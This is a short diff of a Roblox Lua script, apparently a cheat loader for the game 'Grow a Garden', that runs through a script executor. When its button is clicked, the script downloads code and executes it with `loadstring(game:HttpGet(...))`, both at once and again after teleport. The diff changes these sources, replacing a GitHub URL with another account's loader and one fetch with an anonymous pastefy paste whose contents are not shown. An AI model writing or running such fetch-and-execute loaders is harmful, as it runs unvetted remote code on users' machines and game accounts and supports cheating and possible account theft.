@@ -257,15 +257,15 @@ countdownConnection = runService.Heartbeat:Connect(function()
 end)
 
 activateButton.MouseButton1Click:Connect(function()
+    activateButton.Text = "ACTIVATING..."
     queue_on_teleport([[
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/visual.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocariwins/growagarden/refs/heads/main/important/mainloader.lua"))()
     ]])
     task.wait(5)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/pc9MfJgM/raw"))()
     if activateButton.Active then
         activateButton.Active = false
         tweenService:Create(activateButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(50, 50, 50), TextTransparency = 0.5}):Play()
-        activateButton.Text = "ACTIVATING..."
         task.wait(1.5)
         gui:Destroy()
     end
